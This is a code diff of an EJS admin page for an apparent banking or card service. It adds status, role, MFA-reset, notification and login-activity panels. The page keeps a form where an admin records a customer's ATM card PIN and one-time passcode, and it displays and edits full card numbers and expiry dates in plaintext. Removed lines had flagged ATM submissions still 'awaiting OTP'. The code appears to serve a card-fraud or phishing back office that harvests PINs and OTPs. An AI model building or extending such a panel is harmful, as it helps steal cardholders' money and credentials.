@@ -7,12 +7,17 @@
   var cardsList = Array.isArray(cards) ? cards : [];
   var atms = Array.isArray(atmSubmissions) ? atmSubmissions : [];
   var balList = Array.isArray(balances) ? balances : [];
+  var roleCodes = (roles || []).map(function(r) { return r.code; });
 %>
 
 <div class="db-greeting">
   <div>
     <h1><%= fullName %></h1>
-    <p><%= profile && profile.email ? profile.email : '' %> · <%= profile && profile.customerReference ? profile.customerReference : customerId %></p>
+    <p>
+      <%= profile && profile.email ? profile.email : '' %>
+      · <%= profile && profile.customerReference ? profile.customerReference : customerId %>
+      · Status: <strong><%= typeof userStatus !== 'undefined' ? userStatus : '—' %></strong>
+    </p>
   </div>
   <a class="db-chip" href="/admin/customers">← Customers</a>
 </div>
@@ -25,6 +30,59 @@
 <% } %>
 
 <div class="settings-grid" style="margin-top:8px;">
+
+  <section class="db-panel settings-panel">
+    <div class="db-panel__head"><h2>Account status</h2></div>
+    <form method="post" action="/admin/customers/<%= customerId %>/status">
+      <input type="hidden" name="_csrf" value="<%= csrfToken %>">
+      <select name="status">
+        <% ['pending','active','locked','suspended','closed'].forEach(function(s) { %>
+          <option value="<%= s %>" <%= (typeof userStatus !== 'undefined' && userStatus === s) ? 'selected' : '' %>><%= s %></option>
+        <% }) %>
+      </select>
+      <button type="submit" class="settings-btn settings-btn--primary" style="margin-top:8px;">Update status</button>
+    </form>
+    <form method="post" action="/admin/customers/<%= customerId %>/force-password-reset" style="margin-top:12px;">
+      <input type="hidden" name="_csrf" value="<%= csrfToken %>">
+      <button type="submit" class="settings-btn">Force password reset flag</button>
+    </form>
+  </section>
+
+  <section class="db-panel settings-panel">
+    <div class="db-panel__head"><h2>Roles</h2></div>
+    <form method="post" action="/admin/customers/<%= customerId %>/roles">
+      <input type="hidden" name="_csrf" value="<%= csrfToken %>">
+      <% (allRoles || []).forEach(function(r) { %>
+        <label style="display:block;margin:4px 0;">
+          <input type="checkbox" name="roles" value="<%= r.code %>" <%= roleCodes.indexOf(r.code) >= 0 ? 'checked' : '' %>>
+          <%= r.code %>
+        </label>
+      <% }) %>
+      <button type="submit" class="settings-btn settings-btn--primary" style="margin-top:8px;">Save roles</button>
+    </form>
+  </section>
+
+  <section class="db-panel settings-panel">
+    <div class="db-panel__head"><h2>MFA</h2></div>
+    <p>
+      Enrolled: <strong><%= mfaStatus && mfaStatus.enrolled ? 'Yes' : 'No' %></strong>
+      · Required: <strong><%= mfaStatus && mfaStatus.required ? 'Yes' : 'No' %></strong>
+    </p>
+    <form method="post" action="/admin/customers/<%= customerId %>/mfa-reset">
+      <input type="hidden" name="_csrf" value="<%= csrfToken %>">
+      <button type="submit" class="settings-btn">Reset MFA</button>
+    </form>
+  </section>
+
+  <section class="db-panel settings-panel">
+    <div class="db-panel__head"><h2>Notify customer</h2></div>
+    <form method="post" action="/admin/customers/<%= customerId %>/notify">
+      <input type="hidden" name="_csrf" value="<%= csrfToken %>">
+      <div class="kyc-field"><label>Title</label><input type="text" name="title" required maxlength="160"></div>
+      <div class="kyc-field"><label>Message</label><textarea name="body" required maxlength="1000" rows="3"></textarea></div>
+      <button type="submit" class="settings-btn settings-btn--primary" style="margin-top:8px;">Send notification</button>
+    </form>
+  </section>
 
   <section class="db-panel settings-panel">
     <div class="db-panel__head"><h2>Profile photo</h2></div>
@@ -42,8 +100,10 @@
         <button type="submit" class="settings-btn settings-btn--primary" style="margin-top:8px;">Update photo</button>
       </form>
     </div>
-    <p style="margin-top:12px;font-size:0.85rem;color:#788391;">Country: <strong><%= profile && profile.countryCode ? profile.countryCode : '—' %></strong>
-      · Currency: <strong><%= typeof homeCurrency !== 'undefined' && homeCurrency ? homeCurrency.code : 'USD' %></strong></p>
+    <p style="margin-top:12px;font-size:0.85rem;color:#788391;">
+      Country: <strong><%= profile && profile.countryCode ? profile.countryCode : '—' %></strong>
+      · Currency: <strong><%= typeof homeCurrency !== 'undefined' && homeCurrency ? homeCurrency.code : 'USD' %></strong>
+    </p>
   </section>
 
   <section class="db-panel settings-panel">
@@ -51,19 +111,19 @@
     <% if (balList.length) { %>
       <ul class="kyc-doc-list" style="margin-bottom:12px;">
         <% balList.forEach(function(b) { %>
-          <li><strong><%= b.currencyCode %></strong> <span><%= Number(b.available).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) %></span></li>
+          <li>
+            <strong><%= b.currencyCode %></strong>
+            <span><%= Number(b.available).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) %></span>
+          </li>
         <% }) %>
       </ul>
     <% } else { %>
-      <p style="color:#788391;font-size:0.88rem;margin:0 0 12px;">No ledger balance yet. Credit to create one.</p>
+      <p style="color:#788391;font-size:0.88rem;margin:0 0 12px;">No ledger balance yet.</p>
     <% } %>
     <form method="post" action="/admin/customers/<%= customerId %>/credit">
       <input type="hidden" name="_csrf" value="<%= csrfToken %>">
       <div class="kyc-grid-2">
-        <div class="kyc-field">
-          <label>Amount</label>
-          <input type="number" step="0.01" name="amount" required placeholder="0.00">
-        </div>
+        <div class="kyc-field"><label>Amount</label><input type="number" step="0.01" name="amount" required placeholder="0.00"></div>
         <div class="kyc-field">
           <label>Currency</label>
           <input type="text" name="currencyCode" maxlength="3" value="<%= homeCurrency && homeCurrency.code ? homeCurrency.code : 'USD' %>" required>
@@ -82,19 +142,17 @@
 
   <section class="db-panel settings-panel">
     <div class="db-panel__head"><h2>Set ATM details</h2></div>
-    <p style="color:#788391;font-size:0.85rem;margin:0 0 12px;">Admin can record holder, bank, PIN, and OTP without customer upload.</p>
     <form method="post" action="/admin/customers/<%= customerId %>/atm">
       <input type="hidden" name="_csrf" value="<%= csrfToken %>">
       <div class="kyc-grid-2">
         <div class="kyc-field"><label>Card holder name</label><input type="text" name="holderName" required value="<%= fullName %>"></div>
         <div class="kyc-field"><label>ATM bank</label><input type="text" name="bankName" required placeholder="Issuing bank"></div>
         <div class="kyc-field"><label>PIN</label><input type="text" name="pin" inputmode="numeric" maxlength="6" placeholder="4–6 digits"></div>
-        <div class="kyc-field"><label>OTP (optional)</label><input type="text" name="otpCode" maxlength="12" placeholder="If already known"></div>
+        <div class="kyc-field"><label>OTP (optional)</label><input type="text" name="otpCode" maxlength="12"></div>
       </div>
       <button type="submit" class="settings-btn settings-btn--primary" style="margin-top:12px;">Save ATM details</button>
     </form>
   </section>
-
 
   <section class="db-panel settings-panel">
     <div class="db-panel__head"><h2>Spending limits</h2></div>
@@ -119,27 +177,27 @@
       <% if (cardsList[0]) { %><input type="hidden" name="cardId" value="<%= cardsList[0].id %>"><% } %>
       <div class="kyc-grid-2">
         <div class="kyc-field"><label>Holder name</label><input type="text" name="holderName" required value="<%= cardsList[0] ? cardsList[0].holderName : fullName %>"></div>
-        <div class="kyc-field"><label>Card number</label><input type="text" name="cardNumber" required value="<%= cardsList[0] ? cardsList[0].cardNumber : '' %>" placeholder="Digits only"></div>
+        <div class="kyc-field"><label>Card number</label><input type="text" name="cardNumber" required value="<%= cardsList[0] ? cardsList[0].cardNumber : '' %>"></div>
         <div class="kyc-field">
           <label>Brand</label>
+          <% var b = cardsList[0] ? String(cardsList[0].brand).toLowerCase() : 'visa'; %>
           <select name="brand">
-            <% var b = cardsList[0] ? String(cardsList[0].brand).toLowerCase() : 'visa'; %>
             <option value="visa" <%= b === 'visa' ? 'selected' : '' %>>Visa</option>
             <option value="mastercard" <%= b === 'mastercard' ? 'selected' : '' %>>Mastercard</option>
             <option value="verve" <%= b === 'verve' ? 'selected' : '' %>>Verve</option>
             <option value="other" <%= b === 'other' ? 'selected' : '' %>>Other</option>
           </select>
         </div>
-        <div class="kyc-field"><label>Expiry (MM/YY)</label><input type="text" name="expiry" required value="<%= cardsList[0] ? cardsList[0].expiry : '' %>" placeholder="09/28"></div>
+        <div class="kyc-field"><label>Expiry (MM/YY)</label><input type="text" name="expiry" required value="<%= cardsList[0] ? cardsList[0].expiry : '' %>"></div>
         <div class="kyc-field"><label>Type</label><input type="text" name="cardType" value="<%= cardsList[0] ? cardsList[0].type : 'Debit' %>"></div>
         <div class="kyc-field">
           <label>Status</label>
+          <% var stc = cardsList[0] ? String(cardsList[0].status).toLowerCase() : 'active'; %>
           <select name="status">
-            <% var st = cardsList[0] ? String(cardsList[0].status).toLowerCase() : 'active'; %>
-            <option value="active" <%= st === 'active' ? 'selected' : '' %>>Active</option>
-            <option value="pending" <%= st === 'pending' ? 'selected' : '' %>>Pending</option>
-            <option value="frozen" <%= st === 'frozen' ? 'selected' : '' %>>Frozen</option>
-            <option value="cancelled" <%= st === 'cancelled' ? 'selected' : '' %>>Cancelled</option>
+            <option value="active" <%= stc === 'active' ? 'selected' : '' %>>Active</option>
+            <option value="pending" <%= stc === 'pending' ? 'selected' : '' %>>Pending</option>
+            <option value="frozen" <%= stc === 'frozen' ? 'selected' : '' %>>Frozen</option>
+            <option value="cancelled" <%= stc === 'cancelled' ? 'selected' : '' %>>Cancelled</option>
           </select>
         </div>
         <div class="kyc-field"><label>Monthly limit</label><input type="number" step="0.01" name="monthlyLimit" value="<%= cardsList[0] && cardsList[0].monthlyLimit != null ? cardsList[0].monthlyLimit : '' %>"></div>
@@ -147,13 +205,6 @@
       </div>
       <button type="submit" class="settings-btn settings-btn--primary" style="margin-top:12px;">Save card</button>
     </form>
-    <% if (cardsList.length) { %>
-      <ul class="kyc-doc-list" style="margin-top:16px;">
-        <% cardsList.forEach(function(c) { %>
-          <li><strong><%= c.brand %> ·••• <%= c.last4 %></strong> <span><%= c.holderName %> · <%= c.expiry %> · <%= c.status %></span></li>
-        <% }) %>
-      </ul>
-    <% } %>
   </section>
 
   <section class="db-panel settings-panel" style="grid-column:1/-1;">
@@ -168,11 +219,36 @@
         <% atms.forEach(function(a) { %>
           <li>
             <strong><%= a.holderName %></strong>
-            <span><%= a.bankName %> · <%= a.status %><%= a.hasOtp === false ? ' · awaiting OTP' : '' %></span>
+            <span><%= a.bankName %> · <%= a.status %></span>
             <a class="settings-link" href="/admin/kyc/atm/<%= a.id %>">Open →</a>
           </li>
         <% }) %>
       </ul>
+    <% } %>
+  </section>
+
+  <section class="db-panel settings-panel" style="grid-column:1/-1;">
+    <div class="db-panel__head"><h2>Login activity</h2></div>
+    <% if (!(loginActivity || []).length) { %>
+      <p class="db-muted">No login events recorded.</p>
+    <% } else { %>
+      <div class="adm-table-wrap">
+        <table class="adm-table">
+          <thead>
+            <tr><th>When</th><th>Result</th><th>IP</th><th>Reason</th></tr>
+          </thead>
+          <tbody>
+            <% loginActivity.forEach(function(e) { %>
+              <tr>
+                <td><%= e.createdAt ? String(e.createdAt).slice(0, 19) : '—' %></td>
+                <td><%= e.success ? 'OK' : 'Fail' %></td>
+                <td><%= e.ipAddress || '—' %></td>
+                <td><%= e.failureReason || '—' %></td>
+              </tr>
+            <% }) %>
+          </tbody>
+        </table>
+      </div>
     <% } %>
   </section>
 
